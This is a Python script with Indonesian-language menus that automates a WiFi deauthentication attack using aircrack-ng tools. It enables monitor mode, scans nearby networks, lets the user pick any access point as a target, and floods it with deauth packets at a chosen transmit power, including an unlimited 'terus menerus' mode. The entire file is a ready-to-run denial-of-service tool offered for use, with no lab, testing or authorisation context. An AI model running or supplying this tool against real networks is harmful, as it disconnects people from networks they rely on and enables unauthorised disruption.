#!/usr/bin/env python3
import csv
import glob
import os
import re
import subprocess
import sys
import tempfile
import time

# ---------- ANSI ----------
RESET = "\033[0m"
BOLD = "\033[1m"
CLEAR = "\033[2J\033[H"

COLORS = {
    "green": "\033[92m",
    "red": "\033[91m",
    "cyan": "\033[96m",
    "yellow": "\033[93m",
    "purple": "\033[95m",
    "white": "\033[97m",
    "magenta": "\033[35m",
}

GREEN = COLORS["green"]
RED = COLORS["red"]
CYAN = COLORS["cyan"]
YELLOW = COLORS["yellow"]
MAGENTA = COLORS["magenta"]

# ================= Util =================

def clear_screen():
    sys.stdout.write(CLEAR)
    sys.stdout.flush()

def loading(text, duration=1):
    """Tampilkan loading sederhana"""
    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    for i in range(duration * 10):
        sys.stdout.write(f"\r  {YELLOW}{BOLD}{chars[i % len(chars)]} {text}{RESET}")
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write("\r" + " " * 50 + "\r")
    sys.stdout.flush()

# ================= Wireless Functions =================

def get_wireless_interfaces():
    output = subprocess.run(["ip", "link"], capture_output=True, text=True).stdout
    interfaces = []
    for line in output.splitlines():
        m = re.match(r"^\d+:\s+(\S+):", line)
        if m:
            name = m.group(1)
            if name == "lo":
                continue
            interfaces.append(name)
    return interfaces

def get_monitor_interface_name(adapter, output):
    current_ifaces = get_wireless_interfaces()
    for iface in current_ifaces:
        if iface != adapter and iface.endswith("mon"):
            return iface

    match = re.search(r"\[(?:phy\d+)\]([A-Za-z0-9_.:-]+mon)\b", output, re.IGNORECASE)
    if match:
        return match.group(1)

    match = re.search(r"\b([A-Za-z0-9_.:-]+mon)\b", output, re.IGNORECASE)
    if match:
        return match.group(1)

    try:
        iw_output = subprocess.run(["iw", "dev"], capture_output=True, text=True).stdout
        for line in iw_output.splitlines():
            m = re.search(r"\bInterface\s+(\S+)", line)
            if m:
                iface = m.group(1)
                if iface != adapter and iface.endswith("mon"):
                    return iface
    except FileNotFoundError:
        pass

    return f"{adapter}mon"

def run_command(cmd, show_output=False):
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        return None
    return result

def start_monitor_mode(adapter):
    loading(f"Mengaktifkan monitor mode pada {adapter}...", 2)
    run_command(["sudo", "airmon-ng", "check", "kill"], show_output=False)
    result = run_command(["sudo", "airmon-ng", "start", adapter], show_output=False)
    
    if result is None:
        return adapter

    output = (result.stdout or "") + (result.stderr or "")
    monitor_iface = get_monitor_interface_name(adapter, output)
    time.sleep(0.5)
    return monitor_iface

def scan_networks(adapter, duration=10):
    loading("Scanning WiFi networks...", 2)
    
    temp_dir = tempfile.mkdtemp(prefix="airodump-", dir="/tmp")
    prefix = os.path.join(temp_dir, "scan")
    proc = subprocess.Popen(
        ["sudo", "airodump-ng", "--write", prefix, "--output-format", "csv", adapter],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    try:
        time.sleep(duration)
    finally:
        if proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait()

    networks = []
    seen = set()
    for csv_path in sorted(glob.glob(prefix + "-*.csv")):
        with open(csv_path, newline="", encoding="utf-8", errors="ignore") as handle:
            reader = csv.reader(handle)
            for row in reader:
                if len(row) < 14:
                    continue
                bssid = row[0].strip()
                channel = row[3].strip()
                essid = row[13].strip()
                if not bssid or bssid.lower() == "bssid" or not essid:
                    continue
                key = (bssid, channel, essid)
                if key in seen:
                    continue
                seen.add(key)
                networks.append({"bssid": bssid, "channel": channel, "essid": essid})

    for path in glob.glob(prefix + "-*.csv"):
        try:
            os.remove(path)
        except OSError:
            pass
    try:
        os.rmdir(temp_dir)
    except OSError:
        pass

    return networks

def stop_monitor_mode(monitor_iface):
    loading("Membersihkan monitor mode...", 1)
    
    candidates = [monitor_iface]
    if monitor_iface.endswith("mon"):
        candidates.append(monitor_iface[:-3])
    else:
        candidates.append(f"{monitor_iface}mon")

    for name in candidates:
        result = run_command(["sudo", "airmon-ng", "stop", name], show_output=False)
        if result is not None:
            break

    run_command(["sudo", "systemctl", "restart", "NetworkManager"], show_output=False)

def set_monitor_channel(monitor_iface, channel):
    if not channel:
        return
    run_command(["sudo", "iw", "dev", monitor_iface, "set", "channel", str(channel)], show_output=False)

def set_tx_power(monitor_iface, power_level):
    """Set TX power berdasarkan level"""
    power_map = {
        "lemah": "1",
        "sedang": "10",
        "kuat": "30"
    }
    power_mw = power_map.get(power_level.lower(), "10")
    run_command(["sudo", "iw", "dev", monitor_iface, "set", "txpower", "fixed", power_mw + "mW"], show_output=False)

def run_deauth_attack(target, monitor_iface, power_level, packet_count, retries=3):
    set_monitor_channel(monitor_iface, target.get("channel"))
    
    # Set power
    set_tx_power(monitor_iface, power_level)
    
    # Build command
    if packet_count == "unlimited" or packet_count == "0":
        cmd = ["sudo", "aireplay-ng", "-0", "0", "-a", target["bssid"], monitor_iface]
    else:
        cmd = ["sudo", "aireplay-ng", "-0", str(packet_count), "-a", target["bssid"], monitor_iface]
    
    print(f"\n  {CYAN}[*] Menjalankan serangan deauth{RESET}")
    print(f"  {YELLOW}Target: {target['essid']} ({target['bssid']}){RESET}")
    print(f"  {YELLOW}Power: {power_level.upper()}{RESET}")
    print(f"  {YELLOW}Paket: {'∞' if packet_count == 'unlimited' or packet_count == '0' else packet_count}{RESET}")
    print(f"  {YELLOW}Command: {' '.join(cmd)}{RESET}\n")
    
    for attempt in range(1, retries + 1):
        result = run_command(cmd, show_output=False)
        if result is not None:
            print(f"\n  {GREEN}[✓] Serangan selesai!{RESET}")
            return

        if attempt < retries:
            loading(f"Mencoba ulang ({attempt}/{retries})...", 1)

    print(f"\n  {RED}[✗] Serangan gagal setelah {retries} percobaan.{RESET}")

def back_to_menu():
    menu_path = os.path.join(os.path.dirname(__file__), "deauth-menu.py")
    if not os.path.exists(menu_path):
        menu_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "deauth-menu.py"))
    os.execvp(sys.executable, [sys.executable, menu_path])

def select_interface():
    clear_screen()
    print(f"\n  {CYAN}{BOLD}╔══════════════════════════════════════════╗{RESET}")
    print(f"  {CYAN}{BOLD}║{RESET} {YELLOW}{BOLD}DEAUTH ATTACK{RESET}                 {CYAN}{BOLD}║{RESET}")
    print(f"  {CYAN}{BOLD}╚══════════════════════════════════════════╝{RESET}\n")
    
    loading("Scanning interfaces...", 1)
    ifaces = get_wireless_interfaces()
    if not ifaces:
        print(f"  {RED}[✗] Tidak ada interface ditemukan.{RESET}")
        sys.exit(1)

    print(f"  {BOLD}Pilih interface:{RESET}")
    for idx, name in enumerate(ifaces, start=1):
        print(f"  {GREEN}{idx}.{RESET} {name}")

    while True:
        choice = input(f"\n  {YELLOW}>> nomor : {RESET}").strip()
        if choice.isdigit() and 1 <= int(choice) <= len(ifaces):
            selected = ifaces[int(choice) - 1]
            return selected
        print(f"  {RED}[!] Input salah, coba lagi.{RESET}")

def select_target(networks):
    if not networks:
        print(f"  {RED}[✗] Tidak ada jaringan ditemukan.{RESET}")
        return None

    clear_screen()
    print(f"\n  {CYAN}{BOLD}╔══════════════════════════════════════════╗{RESET}")
    print(f"  {CYAN}{BOLD}║{RESET} {YELLOW}{BOLD}PILIH TARGET{RESET}                    {CYAN}{BOLD}║{RESET}")
    print(f"  {CYAN}{BOLD}╚══════════════════════════════════════════╝{RESET}\n")

    print(f"  {'No':<3} {'ESSID':<25} {'CH':<3} {'BSSID'}")
    print(f"  {YELLOW}{'=' * 50}{RESET}")
    for idx, net in enumerate(networks, start=1):
        essid = net["essid"][:25]
        print(f"  {GREEN}{idx:<3}{RESET} {essid:<25} {net['channel']:<3} {net['bssid']}")

    while True:
        choice = input(f"\n  {YELLOW}>> nomor target : {RESET}").strip()
        if choice.isdigit() and 1 <= int(choice) <= len(networks):
            selected = networks[int(choice) - 1]
            print(f"\n  {GREEN}[✓] Target: {selected['essid']}{RESET}")
            return selected
        print(f"  {RED}[!] Input salah, coba lagi.{RESET}")

def get_attack_params():
    """Minta input power dan jumlah paket"""
    clear_screen()
    print(f"\n  {CYAN}{BOLD}╔══════════════════════════════════════════╗{RESET}")
    print(f"  {CYAN}{BOLD}║{RESET} {YELLOW}{BOLD}PARAMETER SERANGAN{RESET}              {CYAN}{BOLD}║{RESET}")
    print(f"  {CYAN}{BOLD}╚══════════════════════════════════════════╝{RESET}\n")
    
    # Pilih power
    print(f"  {BOLD}Pilih kekuatan sinyal:{RESET}")
    print(f"  {GREEN}1.{RESET} LEMAH  (jarak dekat, stealth)")
    print(f"  {GREEN}2.{RESET} SEDANG (jarak sedang, balance)")
    print(f"  {GREEN}3.{RESET} KUAT   (jarak jauh, agresif)")
    
    power_level = "sedang"
    while True:
        choice = input(f"\n  {YELLOW}>> pilih [1-3] : {RESET}").strip()
        if choice == "1":
            power_level = "lemah"
            break
        elif choice == "2":
            power_level = "sedang"
            break
        elif choice == "3":
            power_level = "kuat"
            break
        print(f"  {RED}[!] Pilih 1, 2, atau 3.{RESET}")
    
    # Pilih jumlah paket
    print(f"\n  {BOLD}Pilih jumlah paket deauth:{RESET}")
    print(f"  {GREEN}1.{RESET} 100 paket (cepat)")
    print(f"  {GREEN}2.{RESET} 1000 paket (standar)")
    print(f"  {GREEN}3.{RESET} Unlimited (terus menerus)")
    print(f"  {GREEN}4.{RESET} Custom (input sendiri)")
    
    packet_count = "1000"
    while True:
        choice = input(f"\n  {YELLOW}>> pilih [1-4] : {RESET}").strip()
        if choice == "1":
            packet_count = "100"
            break
        elif choice == "2":
            packet_count = "1000"
            break
        elif choice == "3":
            packet_count = "unlimited"
            break
        elif choice == "4":
            while True:
                custom = input(f"  {YELLOW}>> jumlah paket : {RESET}").strip()
                if custom.isdigit() and int(custom) > 0:
                    packet_count = custom
                    break
                elif custom == "0":
                    packet_count = "unlimited"
                    break
                print(f"  {RED}[!] Masukkan angka positif.{RESET}")
            break
        print(f"  {RED}[!] Pilih 1, 2, 3, atau 4.{RESET}")
    
    return power_level, packet_count

def main():
    adapter = None
    monitor_iface = None

    try:
        # Select interface
        adapter = select_interface()
        monitor_iface = start_monitor_mode(adapter)
        
        # Scan duration
        clear_screen()
        print(f"\n  {CYAN}{BOLD}╔══════════════════════════════════════════╗{RESET}")
        print(f"  {CYAN}{BOLD}║{RESET} {YELLOW}{BOLD}SCAN WIFI{RESET}                      {CYAN}{BOLD}║{RESET}")
        print(f"  {CYAN}{BOLD}╚══════════════════════════════════════════╝{RESET}\n")
        
        print(f"  {YELLOW}Mau scan berapa detik? (default 10){RESET}")
        scan_input = input(f"  {YELLOW}>> detik : {RESET}").strip()
        
        if scan_input.isdigit() and int(scan_input) > 0:
            scan_duration = int(scan_input)
        else:
            scan_duration = 10

        # Scan networks
        networks = scan_networks(monitor_iface, duration=scan_duration)
        target = select_target(networks)

        if target is None:
            print(f"\n  {RED}[✗] Tidak ada target.{RESET}")
            stop_monitor_mode(monitor_iface)
            return

        # Get attack parameters
        power_level, packet_count = get_attack_params()

        # Run attack
        run_deauth_attack(target, monitor_iface, power_level, packet_count)
        
        # Clean up
        print(f"\n  {YELLOW}[!] Tekan Enter untuk kembali...{RESET}")
        input()
        stop_monitor_mode(monitor_iface)
        back_to_menu()

    except KeyboardInterrupt:
        print(f"\n\n  {YELLOW}[!] Dibatalakan oleh user{RESET}")
        if monitor_iface:
            stop_monitor_mode(monitor_iface)
        back_to_menu()

if __name__ == "__main__":
    main()